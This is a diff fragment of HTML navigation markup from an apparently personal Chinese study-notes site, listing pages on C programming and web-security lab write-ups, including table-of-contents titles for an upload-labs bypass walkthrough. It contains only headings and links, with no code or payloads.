+  <span class="md-ellipsis">
+    Next数组-观察法
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    C语言
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            C语言
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3_1" id="__nav_2_3_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Alpha
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Alpha
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/Alpha-%E6%95%B0%E7%BB%84/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 数组
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/Alpha-%E5%87%BD%E6%95%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 函数
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/Alpha-%E6%8C%87%E9%92%88/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 指针
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    数组必做题
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    期末必做题
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3_2" id="__nav_2_3_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    作业
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            作业
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E9%93%BE%E8%A1%A8%E4%BD%9C%E4%B8%9A/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    链表作业
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%BD%9C%E4%B8%9A/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    文件操作作业
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3_3" id="__nav_2_3_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    知识点
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            知识点
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    位运算总结（转载）
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E5%B8%B8%E8%80%83%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    C 语言常考函数总结
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    文件读写常用函数总结
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/Scanf%20%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%81%87%E5%88%B0%E7%A9%BA%E6%A0%BC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    使用 scanf 时对空格处理？
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    网络安全
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            网络安全
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    靶场
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            靶场
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pikachu靶场打靶记录
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Upload labs靶场打靶记录
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Upload labs靶场打靶记录
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#upload-labs" class="md-nav__link">
+    <span class="md-ellipsis">
+      一、upload-labs 靶场简介
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      二、打靶记录
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="二、打靶记录">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pass-01-js" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-01 JS 校验
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-02-mime" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-02 文件类型校验(MIME 校验)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-03" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-03 文件名后缀校验(黑名单绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-04-htaccess" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-04 文件名后缀校验 (配置文件解析控制) .htaccess
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-05-userini" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-05 文件名后缀校验 (配置文件解析控制) .user.ini
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-06" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-06 文件名后缀校验 (大小写绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-07" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-07 文件名后缀校验 (空格绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-08" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-08 文件名后缀校验 (点号绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-09-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-09 文件名后缀校验 (::$DATA 绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-10" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-10 文件名后缀校验 (拼接绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-11" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-11 文件名后缀校验 (双写绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-12-get-0x00" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-12 白名单校验 (GET 型 0x00 截断)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-13-post-0x00" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-13 白名单校验 ( POST 型 0x00 截断)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-14" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-14 文件内容检测 (文件头校验)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-15-getimagesize" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-15 文件内容检测 (getimagesize()校验)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-16-exif_imagetype" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-16 文件内容检测 (exif_imagetype()绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-17" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-17 文件内容检测 (二次渲染)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-18" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-18 逻辑漏洞 (条件竞争)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-19-apache" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-19 逻辑漏洞 (条件竞争-Apache解析漏洞)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-20" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-20 逻辑漏洞 (小数点绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-21" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-21 逻辑漏洞 (数组绕过)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Xss labs靶场打靶记录
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Sqli-labs%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sqli labs笔记
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CTFHub%E6%8A%80%E8%83%BD%E6%A0%91%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFHub技能树笔记
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XXE%E6%89%93%E9%9D%B6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XXE 打靶记录
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    CTFShow
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            CTFShow
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFshow-web/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow-WEB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow 信息泄露
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-%E7%88%86%E7%A0%B4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow 爆破
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-RCE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow RCE
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow 文件包含
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFShow PHP特性
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow 文件上传
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-Sql%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow Sql注入
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-XXE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow XXE
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    其他
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            其他
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/JavaScript%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JavaScript笔记
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PHP反序列化
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/windterm%E8%BF%9E%E6%8E%A5kali/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windterm连接kali
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/group-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Group by报错注入
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/information_schema/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Information schema
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sql注入—udf 提权
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/mysql%E5%90%91%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99webshell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mysql向日志文件写webshell
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E5%88%9D%E7%BA%A7%29/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PHP+MySQL博客（初级）
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PHP+MySQL博客（高级）
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/Python%E6%AD%A3%E5%88%99/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    python正则表达式
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    信息收集
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    转载
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            转载
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/%E6%96%87%E4%BB%B6%E5%A4%B4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    文件头、尾总结
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/HTTP%E6%8A%A5%E6%96%87/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTTP 报文
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/SSH-%E8%BF%9E%E6%8E%A5%E6%97%B6%E9%97%B4%E8%B6%85%E6%97%B6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSH:连接时间超时
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/git-stash%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    git-stash 用法小结
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/dirsearch%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    dirsearch 使用指南
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    常见的 php 伪协议
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/Feroxbuster/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Feroxbuster使用说明
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS 重绑定漏洞
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/MySQL%20loaddata%E7%94%A8%E6%B3%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MySQL loaddata用法
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    常见的 php 伪协议
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/Apache%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Apache 换行解析漏洞
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_6" id="__nav_3_6_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    培训任务
+  </span>
+  
+
